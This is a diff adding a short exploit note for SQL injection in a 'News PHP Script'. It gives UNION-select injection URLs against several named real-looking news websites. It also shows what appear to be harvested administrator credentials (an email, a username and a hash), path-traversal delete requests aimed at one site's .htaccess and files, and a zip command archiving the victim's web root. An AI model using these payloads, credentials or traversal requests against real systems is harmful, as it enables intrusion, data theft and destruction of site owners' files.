@@ -1,0 +1,39 @@
+
+addslashes -> ' -> \' 
+			  " -> \"
+			  
+magic_quotes_gpc  -> 
+
+
+# Exploit Title: News PHP Script Sql Injection
+# Date: 2018-09-27
+# Exploit Author: Jafar
+# Vendor Homepage: http://www.gazisoft.com/
+# Version: All Ver
+
+Demo or Poc :
+http://www.tomarzahaber.biz/ajax/hctab.php?hctab=-4%27+union+select+1,user(),3,4,5,6%23
+
+Exploit : 
+http://target.com/ajax/hctab.php?hctab=-4%27+union+select+1,user(),3,4,5,6%23
+
+http://www.tomarzahaber.biz/ajax/hctab.php?hctab=-4%27+union+select+1,user(),3,4,5,6%23
+http://www.vezirkopruozlem.net/ajax/hctab.php?hctab=-4%27+union+select+1,user(),3,4,5,6%23
+http://www.kargihavadis.com/ajax/hctab.php?hctab=-4%27+union+select+1,user(),3,4,5,6%23
+
+muratgurbuzler@gmail.com
+
+jafarali
+
+7b43ef3bfa6934a1f37bbb7b8f0395e3
+
+
+www.tomarzahaber.biz/admin/case/photo/photo.php?proccess=delete&photo=../../../files/Thumbs.db
+
+
+http://www.tomarzahaber.biz/admin/index.php?case=photo&p=image_delete&no=9783&photo=77e28144b8c9a4a8dad8.jpg
+http://www.tomarzahaber.biz/admin/index.php?case=photo&p=image_delete&no=9783&photo=../../../files/.htaccess
+
+
+zip ali.zip /home/cqetomar/public_html/ -r
+
